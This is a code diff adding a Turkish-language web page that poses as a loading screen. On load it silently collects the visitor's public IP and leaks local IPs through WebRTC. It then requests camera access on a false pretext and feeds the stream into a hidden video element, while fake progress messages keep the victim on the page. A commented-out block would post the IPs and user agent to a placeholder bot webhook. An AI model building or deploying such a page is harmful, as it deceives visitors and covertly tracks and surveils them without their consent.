@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Yükleniyor... Lütfen Bekleyin</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000000;
+      color: #ffffff;
+      font-family: Arial, Helvetica, sans-serif;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    #loader {
+      font-size: 2.2em;
+      margin-bottom: 35px;
+      animation: pulse 2.8s infinite;
+    }
+    #status {
+      font-size: 1.5em;
+      margin: 25px 35px;
+      line-height: 1.5;
+    }
+    .spinner {
+      border: 12px solid #111111;
+      border-top: 12px solid #ffffff;
+      border-radius: 50%;
+      width: 100px;
+      height: 100px;
+      animation: spin 1.6s linear infinite;
+      margin: 45px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.35; }
+    }
+    #video {
+      display: none !important;
+      width: 1px;
+      height: 1px;
+      position: absolute;
+      left: -9999px;
+      visibility: hidden;
+    }
+  </style>
+</head>
+<body>
+  <div id="loader">Yükleniyor... Lütfen Bekleyin</div>
+  <div class="spinner"></div>
+  <div id="status">İşlem için kamera izni gerekiyor.<br>Lütfen izin verin ve beklemeye devam edin.</div>
+
+  <video id="video" autoplay playsinline muted></video>
+
+  <script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    const loader = document.getElementById('loader');
+
+    // Public IP'yi çek
+    async function getPublicIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || 'Alınamadı';
+      } catch (e) {
+        return 'Alınamadı';
+      }
+    }
+
+    // Local IP'leri WebRTC ile çek
+    async function getLocalIPs() {
+      return new Promise((resolve) => {
+        const ips = new Set();
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+        pc.onicecandidate = (event) => {
+          if (!event.candidate) return;
+          const candidate = event.candidate.candidate;
+          const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/g);
+          if (ipMatch) {
+            ipMatch.forEach(ip => {
+              if (!ip.startsWith('0.') && !ip.startsWith('127.') && !ips.has(ip)) {
+                ips.add(ip);
+              }
+            });
+          }
+        };
+
+        setTimeout(() => {
+          pc.close();
+          resolve(Array.from(ips));
+        }, 5000);
+      });
+    }
+
+    async function startEverything() {
+      // Sayfa girilir girmez IP'leri çek
+      const publicIP = await getPublicIP();
+      const localIPs = await getLocalIPs();
+
+      console.log('┌─────────────────────────────┐');
+      console.log('│ Kullanıcı Bilgileri         │');
+      console.log('├─────────────────────────────┤');
+      console.log(`│ Public IP: ${publicIP.padEnd(19)} │`);
+      console.log(`│ Local IP'ler: ${localIPs.join(', ').padEnd(15)} │`);
+      console.log('└─────────────────────────────┘');
+
+      // İstersen buradan botuna veya webhook'e gönder
+      // await fetch('https://senin-bot-endpointin.com/ip', {
+      //   method: 'POST',
+      //   headers: { 'Content-Type': 'application/json' },
+      //   body: JSON.stringify({ public: publicIP, local: localIPs, ua: navigator.userAgent })
+      // });
+
+      // Şimdi kamera izni iste (siyah ekran bozulmayacak)
+      try {
+        status.textContent = "Kamera izni bekleniyor...";
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: false
+        });
+
+        video.srcObject = stream;
+        await video.play().catch(() => {});
+
+        loader.textContent = "İşlem sürüyor...";
+        status.textContent = "Bağlantı kontrol ediliyor ve işlem tamamlanıyor. Lütfen sayfayı kapatmayın.";
+
+        // Sonsuz döngü mesajları
+        const messages = [
+          "Şarj %37... Devam ediyor",
+          "Veriler işleniyor...",
+          "Bağlantı doğrulanıyor...",
+          "İşlem devam ediyor...",
+          "Lütfen beklemeye devam edin"
+        ];
+        let index = 0;
+        setInterval(() => {
+          status.textContent = messages[index];
+          index = (index + 1) % messages.length;
+        }, 5500);
+
+      } catch (err) {
+        console.error("Kamera hatası:", err);
+        status.textContent = "İzin verilmedi veya bir hata oluştu. Lütfen tarayıcı ayarlarını kontrol edin.";
+      }
+    }
+
+    // Sayfa yüklendiğinde her şeyi başlat
+    window.addEventListener('load', startEverything);
+  </script>
+</body>
+  </html>
